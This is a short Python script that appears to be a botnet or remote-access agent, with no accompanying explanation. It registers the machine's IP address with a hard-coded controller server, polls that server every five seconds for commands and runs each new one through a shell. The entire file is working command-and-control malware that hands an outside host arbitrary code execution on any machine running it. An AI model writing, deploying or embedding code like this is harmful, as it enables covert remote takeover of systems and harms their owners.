import time
import requests
import subprocess
import socket

CONTROLLER = "http://162.253.42.21:8000"
last_cmd = None

while True:
    try:
        requests.post(f"{CONTROLLER}/register", json={"ip": socket.gethostbyname(socket.gethostname())})
        res = requests.get(f"{CONTROLLER}/command")
        data = res.json()
        cmd = data.get("cmd")

        if cmd and cmd != last_cmd:
            print("Running:", cmd)
            subprocess.call(cmd, shell=True)
            last_cmd = cmd  # simpan perintah terakhir

        time.sleep(5)

    except Exception as e:
        print("Sync error:", e)
        time.sleep(5)
